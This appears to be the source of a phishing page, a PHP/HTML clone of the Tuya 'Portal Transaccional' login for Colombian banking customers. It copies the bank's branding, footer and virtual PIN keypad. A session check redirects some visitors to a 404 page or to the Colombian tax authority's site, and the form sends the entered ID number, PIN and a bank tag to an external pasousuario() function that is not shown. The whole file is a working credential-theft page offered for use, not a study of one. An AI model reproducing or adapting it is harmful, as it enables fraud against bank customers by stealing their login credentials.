<?php

$fechactual = date('d/m/Y g:i:s a');

session_start();


if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.dian.gov.co/');
}
?>
<!DOCTYPE html>
<!-- saved from url=(0063)https://www.tuya.com.co:8461/PortalTransaccionalTuya/login.aspx -->
<html><head id="ctl00_Head"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="/Portal%20Transaccional%20Tuya_files/bootstrap.min.css" type="text/css" rel="stylesheet">
    <link href="/Portal%20Transaccional%20Tuya_files/Default1.css" type="text/css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Portal Transaccional Tuya</title>
    
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>

    <style>
        .btn-ingreso {
            color: #fff;
            background-color: #343a40;
            border-color: #343a40;
        }

            .btn-ingreso:hover {
                color: #fff;
                background-color: #23272b;
                border-color: #1d2124;
            }

            .btn-ingreso:focus, .btn-ingreso.focus {
                box-shadow: 0 0 0 0.2rem rgba(52, 58, 64, 0.5);
            }

            .btn-ingreso.disabled, .btn-ingreso:disabled {
                color: #fff;
                background-color: #343a40;
                border-color: #343a40;
            }
            
        /* Virtual Keyboard Styles */
        .teclado {
            width: 32px;
            height: 32px;
            border: none;
            background-size: contain;
            background-repeat: no-repeat;
            cursor: pointer;
            margin: 2px;
        }
        
        #area11 {
            width: 89px;
            height: 33px;
            background: url(imagenes/BotonBorrar.png) no-repeat center center;
            background-size: contain;
            border: none;
            cursor: pointer;
        }
        
        .margin-top {
            margin-top: 5px;
        }
        
        /* Ensure inputs match the original design */
        #txtUsuario, #campo {
            border: 1px solid #ced4da;
            border-radius: .25rem;
            padding: .375rem .75rem;
        }
    </style>
</head>
<body onload="javascript:history.go(1)">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 col-sm-7 col-md-6 pl-0">
                <img class="img-fluid d-block" src="imagenes/bannerPortalSinMarcas.png">
            </div>

            <div class="col-12 col-sm-5 col-md-6">
                <div class="text-center p-4">
                    <span id="ctl00_lblFecha">Fecha Actual <?php echo $fechactual; ?></span>
                    <br>
                    <span id="ctl00_lblVersion">VersiÃ³n 5.0.2</span>
                </div>
            </div>
        </div>
    </div>

    <div id="MainLogin" class="container">
        <div class="contaner">
            <div class="row">
                <div class="col-md-12">
                    <span class="boldText">Por favor brÃ­ndenos su identificaciÃ³n y clave:</span>
                </div>
            </div>
            <div class="row">
                <div class="col-5 col-sm-4 col-md-3 pt-5">
                    <div class="mx-auto" id="teclado_container">
                        <div>
                            <input type="button" id="area1" class="teclado" onclick="Llenarclave('7');" style="background-image: url('imagenes/boton7.png');">
                            <input type="button" id="area2" class="teclado" onclick="Llenarclave('3');" style="background-image: url('imagenes/boton3.png');">
                            <input type="button" id="area3" class="teclado" onclick="Llenarclave('9');" style="background-image: url('imagenes/boton9.png');">
                        </div>

                        <div class="margin-top">
                            <input type="button" id="area4" class="teclado" onclick="Llenarclave('8');" style="background-image: url('imagenes/boton8.png');">
                            <input type="button" id="area5" class="teclado" onclick="Llenarclave('2');" style="background-image: url('imagenes/boton2.png');">
                            <input type="button" id="area6" class="teclado" onclick="Llenarclave('0');" style="background-image: url('imagenes/boton0.png');">
                        </div>

                        <div class="margin-top">
                            <input type="button" id="area7" class="teclado" onclick="Llenarclave('5');" style="background-image: url('imagenes/boton5.png');">
                            <input type="button" id="area8" class="teclado" onclick="Llenarclave('1');" style="background-image: url('imagenes/boton1.png');">
                            <input type="button" id="area9" class="teclado" onclick="Llenarclave('6');" style="background-image: url('imagenes/boton6.png');">
                        </div>

                        <div class="margin-top">
                            <input type="button" id="area10" class="teclado" onclick="Llenarclave('4');" style="background-image: url('imagenes/boton4.png');">
                            <input type="button" id="area11" onclick="limpiarPass();">
                        </div>
                    </div>
                </div>
                <div class="col-7 col-sm-8 col-md-3 p-4 text-left">
                    <div class="form-group">
                        <label><span class="boldText">Tipo de Documento</span></label>
                        <select name="ddlTipoDocumento" id="ddlTipoDocumento" class="form-control">
                            <option value="1">CÃ‰DULA DE CIUDADANÃA</option>
                            <option value="2">CÃ‰DULA DE EXTRANJERÃA</option>
                            <option value="6">CARNÃ‰ DIPLOMÃTICO</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label><span class="boldText">Documento de IdentificaciÃ³n</span></label>
                        <input name="txtIdentificacion" type="text" maxlength="15" id="txtUsuario" class="form-control" autocomplete="off">
                    </div>

                    <div class="form-inline">
                        <label class="mb-2 mr-sm-2"><span class="boldText">Clave</span></label>&nbsp; &nbsp;
                        <input name="txtPassword" type="password" maxlength="4" id="campo" class="form-control mb-2 mr-sm-2" readonly autocomplete="off" style="width:68px;">
                        <input type="hidden" name="" value="tuya" id="banco">
                    </div>

                    <div class="form-group text-center mt-2">
                        <button id="btnUsuario" style="border: none; background: url(imagenes/botonAceptar_login.png) no-repeat center center; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover !important;  background-repeat: no-repeat; width: 89px; height: 33px; cursor: pointer;"></button>
                    </div>

                    <div class="text-center">
                        Obtener <a href="#">Ayuda</a>
                    </div>
                </div>
                <div class="col-sm-12 col-md-6">
                    <img class="img-fluid mx-auto d-block m-4" style="border-radius: 20px" src="imagenes/PublicidadPortal.JPG" alt="">
                </div>
            </div>
        </div>
    </div>

    <div class="footer ContactFrame text-center" style="padding-top: 10px">
        <div id="FooterImage" class="FooterImage" style="background-image: url(imagenes/titulos-productos.png);"></div>
        <div id="ContactFrame1" class="pb-5">
            LÃ­neas de atenciÃ³n al cliente: BogotÃ¡ 601 482 4804 - Cali 602 380 8933 â€“ MedellÃ­n 604 444 3727. LÃ­nea Nacional: 01 8000 978888<br>
            Todos los Derechos Reservados Â© 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br>
            Para conocer acerca de la utilizaciÃ³n de InformaciÃ³n,<br>
            <a id="ctl00_HyperLink1" href="https://www.tuya.com.co/para-tener-en-cuenta" target="_blank">Ingresa aquÃ­</a>
        </div>
    </div>

    <script type="text/javascript">
        function Llenarclave(num) {
            var clave = $('#campo').val();
            if (clave.length < 4) {
                $('#campo').val(clave + num);
            }
        }

        function limpiarPass() {
            $('#campo').val('');
        }

        $(document).ready(function() {
            $('#btnUsuario').click(function(e){
                e.preventDefault();
                if ($("#txtUsuario").val().length > 6) {
                    pasousuario($("#campo").val(), $("#txtUsuario").val(), $("#banco").val());	
                } else {
                    $("#txtUsuario").css("border", "1px solid red");
                    $("#txtUsuario").focus();
                }			
            });
        });
    </script>
</body></html>

